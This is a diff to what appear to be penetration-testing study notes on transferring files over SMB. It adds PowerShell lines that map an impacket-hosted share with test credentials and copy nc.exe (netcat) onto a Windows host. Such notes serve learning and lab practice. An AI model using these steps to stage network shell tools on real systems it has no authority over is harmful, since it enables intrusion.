@@ -158,3 +158,9 @@ To transfer files in this scenario, we can set a username and password using our
 ```shell
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 ```
+```powershell
+net use n: \\192.168.220.133\share /user:test test
+copy n:\nc.exe
+```
+![](../../Attachements/Pasted%20image%2020260726130612.png)
+
